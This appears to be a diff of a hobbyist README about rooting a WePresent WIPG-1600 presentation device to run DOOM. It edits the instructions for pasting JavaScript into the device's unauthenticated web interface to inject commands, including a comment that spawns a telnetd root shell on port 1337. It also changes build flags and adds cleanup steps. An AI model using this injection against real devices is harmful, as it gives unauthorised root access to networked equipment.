@@ -1,5 +1,5 @@
 # WePresent_WIPG-1600_DOOM
-Hacking the WePresent WIPG 1600 wireless presentation device to get persistent root shell and run DOOM
+Hacking the WePresent WIPG-1600 wireless presentation device to get persistent root shell and run DOOM
 
 [doom.webm](https://github.com/user-attachments/assets/bd86eedd-ffbc-4ae9-aa7f-9b46f52858b6)
 
@@ -17,7 +17,7 @@ Connect to the WePresent's web server, unauthenticated, and paste this into the 
 ```js
 // Spawn telnet shell on port 1337 '/usr/sbin/telnetd -p 1337 -l /bin/ash'
 let COMMAND = 'ping 192.168.0.100 -c 1';
-let DEVICEURL = 'https://192.168.0.110';
+let DEVICEURL = 'https://<device-ip>';
 
 // Replaces problematic characters with built-in identifiers
 function filterChars(cmd) {
@@ -110,23 +110,26 @@ cd fbDOOM/fbdoom
 make clean
 make NOSDL=1 \
   CROSS_COMPILE=arm-linux-gnueabihf- \
-  CFLAGS="-O2 -pipe -march=armv6 -mfpu=vfp -mfloat-abi=hard" \
-  LDFLAGS=""
+  CFLAGS="-O2 -pipe -march=armv6 -mfpu=vfp -mfloat-abi=hard"
 ```
 
 ## Installation & Running
 
 The file can be transferred via the busybox ftpd server or USB flash storage FAT32 formatted. Note: this will also require a **[WAD file](https://github.com/Gaytes/iwad)**
 ```bash
-mount -o remount,rw / # Re-mount as write/read and ensure execution status 
-chmod+x fbdoom
+mount -o remount,rw /   # remount root FS read-write
+chmod +x fbdoom
 ```
 
 For a standard 1920x1080 screen I recommend the following settings for performance:
 ```bash
-fbset -g 1920 1080 1920 1080 16 -accel true # sets the fb geometry, color depth, and hardware acceleration. BPP can only be 16 or 32
+fbset -g 1920 1080 1920 1080 16   # set geometry + 16bpp (or 32bpp if supported)
 fbdoom -iwad doom.wad -scaling 3 -bpp 16 # Render 320x200 * scaling
 ```
+
+## Cleanup / restore
+- Remove copied binaries/WADs from flash storage
+- Reboot the device to restore the default display app and set fs to read-only
 
 ## Enjoy
 
